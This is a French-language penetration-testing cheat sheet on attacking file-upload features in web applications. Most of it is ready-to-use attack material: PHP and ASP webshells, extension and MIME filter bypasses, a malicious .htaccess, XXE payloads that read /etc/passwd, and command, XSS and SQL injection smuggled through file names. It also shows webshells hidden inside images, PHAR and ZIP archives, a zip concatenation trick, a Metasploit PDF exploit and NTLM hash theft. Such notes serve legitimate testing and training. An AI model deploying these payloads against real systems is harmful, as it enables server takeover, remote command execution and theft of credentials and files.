
>[!TIP]
>Check validation en backend ET FRONT END
>FUZZ les extensions avec BURP.
>Identifier le dossier d'upload et GET request pour obtenir reverseshell


## **reverse shells** -> https://www.revshells.com/

# **PHP**

## Lecture de fichier 

```php
<?php file_get_contents('/etc/passwd'); ?>
```

## Execution de commande

```php
<?php system('hostname'); ?>
```

## Webshell basique

```php
<?php system($_REQUEST['cmd']); ?>
```

# **ASP**

## Webshell basique

```asp
<% eval request('cmd') %>
```



# **BYPASSES**

## Client-Side Validation

|                  |                       |
| ---------------- | --------------------- |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
Si fonction appelée, la vérifier grâce à la console

## Filters

>[!TIP]
>Tester les doubles extensions et les reverses double extension (jpg.php et php.jpg)

seclists extensions -> https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
### PHP

extensions php -> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

pdf.php
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg

### ASP

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP

| .asa   |
| ------ |
| .ashx  |
| .asmx  |
| .asp   |
| .aspx  |
| .cer   |
| .soap  |
| .xamlx |

### Générer une WordList avec double extensions et caractères speciaux

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "88930bde509f95012ce4d0fced039642$char$ext.jpg" >> wordlist.txt
        echo "88930bde509f95012ce4d0fced039642$ext$char.jpg" >> wordlist.txt
        echo "88930bde509f95012ce4d0fced039642.jpg$char$ext" >> wordlist.txt
        echo "88930bde509f95012ce4d0fced039642.jpg$ext$char" >> wordlist.txt
    done
done
```


### Content type wordlist

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

### MIME Types

https://en.wikipedia.org/wiki/List_of_file_signatures


### .HTACCESS

Tenter de bypass les restrictions du .htaccess en uploadant un fichier .htaccess malicieux

Content-Type: text/plain

Contenu du fichier (permet d'executer du php dans des fichiers .lol)

```
AddType application/x-httpd-php .lol
```

ou plus complet

```
<FilesMatch "1.lol">
SetHandler application/x-httpd-php
AddHandler php5-script .lol
AddType application/x-httpd-php .lol
</FilesMatch>
php_flag engine on
```

upload ensuite 1.lol avec webshell php




## XXE attack

Lire fichier system

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Lire code source d'un fichier php

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```


## RCE

Injecter une commande dans le nom du fichier

```
file$(whoami).jpg
```

```
file`whoami`.jpg
```

```
file.jpg||whoami
```

## XSS

[[XSS (Cross-Site Scripting)]]

Injecter une XSS dans le nom de fichier

```javascript
"><svg onload = alert(document.cookie)>.docx
```

## SQLi

[[SQLi (Injections SQL)]]

Injecter une requête SQL dans le nom de fichier

```sql
' GROUP BY 1 #
```


### Injecter un webshell dans une image #EXIFTOOL

```
exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' lo.jpg
```

### Image (récupérer URL en inspectant la page)

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```url
./path/to/shell.gif&cmd=id
```


### PHAR

shell.php

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

compiler le fichier au format phar et le renommer en jpg

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```url
phar://./path/to/shell.jpg%2fshell.txt&cmd=id
```


## ZIP

### Wrapper Zip 

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```url
zip://./path/to/shell.jpg%23shell.php&cmd=id
```

### ZIP Archive contenant un lien symbolic

```bash
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

### Zip File Concaténation

https://cybersecuritynews.com/hackers-employ-zip-file-concatenation/

créer webshell.php

```
echo '<?php system($_GET["cmd"]); ?>' > webshell.php
```

utiliser un fichier légitime attendu par l'application (pdf par exemple)

zipper le fichier légitime.

```
zip legit.zip pdf-exemple.pdf
```

zipper le webshell.

```
zip webshell.zip webshell.php
```

concaténer les 2 archives dans une nouvelle archive (l'archive légitime doit être première et la malicieuse en second)

```
cat legit.zip webshell.zip > Final.zip
```


## PDF

### PDF Reverse shell

Metasploit (Adobe Reader v8.x, v9.x )

```
use exploit/windows/fileformat/adobe_pdf_embedded_exe
```

### PDF Steal NTLM Hash

https://github.com/deepzec/Bad-Pdf

Responder doit tourner en smb

